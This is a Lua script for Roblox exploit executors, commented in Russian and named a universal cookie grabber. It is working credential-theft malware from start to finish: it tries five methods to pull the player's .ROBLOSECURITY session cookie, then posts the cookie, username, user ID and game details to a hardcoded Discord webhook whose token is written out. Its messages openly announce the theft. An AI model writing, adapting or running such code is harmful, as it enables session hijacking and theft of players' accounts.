-- Универсальный граббер куки для любого исполнителя
local Webhook = "https://discord.com/api/webhooks/1442171064971952320/Phog3L7YM7QTfHm4H2Y8QhqQnU_-yMaY8IPORBq8V5YkuGzT3SnZ8Ud0bwmYnx8GwQNN"

-- Функция отправки в Discord
function SendMsg(Content, Title, Color)
    local Data = {
        ["content"] = Content,
        ["embeds"] = {{
            ["title"] = Title,
            ["color"] = Color,
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    local Success, Error = pcall(function()
        local Json = game:GetService("HttpService"):JSONEncode(Data)
        return game:GetService("HttpService"):PostAsync(Webhook, Json)
    end)
    
    return Success
end

-- Отправляем стартовое сообщение
SendMsg("🚀 Скрипт запущен", "Universal Cookie Grabber", 16776960)

-- Основные методы получения куки
local Cookie = nil

-- Метод 1: Прямой HTTP запрос (самый рабочий)
local Success1 = pcall(function()
    Cookie = game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx", true)
    if Cookie and #Cookie > 50 then
        SendMsg("✅ Куки получены через HttpGet", "SUCCESS", 65280)
    end
end)

-- Метод 2: Через защищенное соединение
if not Cookie or #Cookie < 50 then
    local Success2 = pcall(function()
        Cookie = game:HttpGet("https://roblox.com/game/GetCurrentUser.ashx", true)
        if Cookie and #Cookie > 50 then
            SendMsg("✅ Куки получены через защищенный HttpGet", "SUCCESS", 65280)
        end
    end)
end

-- Метод 3: Для новых эксплойтов
if not Cookie or #Cookie < 50 then
    local Success3 = pcall(function()
        if request then
            local Response = request({
                Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
                Method = "GET"
            })
            if Response and Response.Body and #Response.Body > 50 then
                Cookie = Response.Body
                SendMsg("✅ Куки получены через request()", "SUCCESS", 65280)
            end
        end
    end)
end

-- Метод 4: Старый метод GetCookie
if not Cookie or #Cookie < 50 then
    local Success4 = pcall(function()
        local Player = game:GetService("Players").LocalPlayer
        Cookie = Player:GetCookie(" .ROBLOSECURITY")
        if Cookie and #Cookie > 50 then
            SendMsg("✅ Куки получены через GetCookie", "SUCCESS", 65280)
        end
    end)
end

-- Метод 5: Через окружение эксплойта
if not Cookie or #Cookie < 50 then
    local Success5 = pcall(function()
        if getrenv then
            local Env = getrenv()
            if Env.getcookie then
                Cookie = Env.getcookie()
            elseif Env.get_cookie then
                Cookie = Env.get_cookie()
            end
            if Cookie and #Cookie > 50 then
                SendMsg("✅ Куки получены через getrenv", "SUCCESS", 65280)
            end
        end
    end)
end

-- Отправляем результат
if Cookie and #Cookie > 50 then
    -- Отправляем основную информацию
    local Player = game:GetService("Players").LocalPlayer
    local GameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    
    local SuccessData = {
        ["content"] = "🎯 **КОКИ УКРАДЕНЫ!**",
        ["embeds"] = {{
            ["title"] = "ROBLOX COOKIE GRABBED",
            ["description"] = "Успешный граб куки",
            ["fields"] = {
                {
                    ["name"] = "👤 Игрок",
                    ["value"] = "```" .. Player.Name .. " (" .. Player.UserId .. ")```",
                    ["inline"] = true
                },
                {
                    ["name"] = "🎮 Игра",
                    ["value"] = "```" .. GameInfo.Name .. "```",
                    ["inline"] = true
                },
                {
                    ["name"] = "🆔 Place ID",
                    ["value"] = "```" .. game.PlaceId .. "```",
                    ["inline"] = true
                },
                {
                    ["name"] = "🔐 ROBLOSECURITY",
                    ["value"] = "```" .. string.sub(Cookie, 1, 100) .. "```",
                    ["inline"] = false
                }
            },
            ["color"] = 65280,
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    pcall(function()
        local Json = game:GetService("HttpService"):JSONEncode(SuccessData)
        game:GetService("HttpService"):PostAsync(Webhook, Json)
    end)
    
    -- Отправляем полную куку отдельным сообщением
    if #Cookie > 1024 then
        local Chunk1 = string.sub(Cookie, 1, 1024)
        local Chunk2 = string.sub(Cookie, 1025, 2048)
        
        local ChunkData1 = {
            ["content"] = "🔐 **ЧАСТЬ 1 КУКИ:**",
            ["embeds"] = {{
                ["description"] = "```" .. Chunk1 .. "```",
                ["color"] = 3447003
            }}
        }
        
        local ChunkData2 = {
            ["content"] = "🔐 **ЧАСТЬ 2 КУКИ:**",
            ["embeds"] = {{
                ["description"] = "```" .. Chunk2 .. "```",
                ["color"] = 3447003
            }}
        }
        
        pcall(function()
            local Json1 = game:GetService("HttpService"):JSONEncode(ChunkData1)
            local Json2 = game:GetService("HttpService"):JSONEncode(ChunkData2)
            game:GetService("HttpService"):PostAsync(Webhook, Json1)
            wait(1)
            game:GetService("HttpService"):PostAsync(Webhook, Json2)
        end)
    else
        local FullCookieData = {
            ["content"] = "🔐 **ПОЛНАЯ КУКА:**",
            ["embeds"] = {{
                ["description"] = "```" .. Cookie .. "```",
                ["color"] = 3447003
            }}
        }
        
        pcall(function()
            local Json = game:GetService("HttpService"):JSONEncode(FullCookieData)
            game:GetService("HttpService"):PostAsync(Webhook, Json)
        end)
    end
    
else
    -- Если куки не получили
    local ErrorData = {
        ["content"] = "❌ **НЕ УДАЛОСЬ ПОЛУЧИТЬ КУКИ**",
        ["embeds"] = {{
            ["title"] = "COOKIE GRAB FAILED",
            ["description"] = "Все методы не сработали",
            ["fields"] = {
                {
                    ["name"] = "👤 Игрок",
                    ["value"] = game:GetService("Players").LocalPlayer.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "🎮 Игра",
                    ["value"] = game.PlaceId,
                    ["inline"] = true
                }
            },
            ["color"] = 16711680,
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    pcall(function()
        local Json = game:GetService("HttpService"):JSONEncode(ErrorData)
        game:GetService("HttpService"):PostAsync(Webhook, Json)
    end)
end

SendMsg("🏁 Скрипт завершил работу", "FINISHED", 10181046)
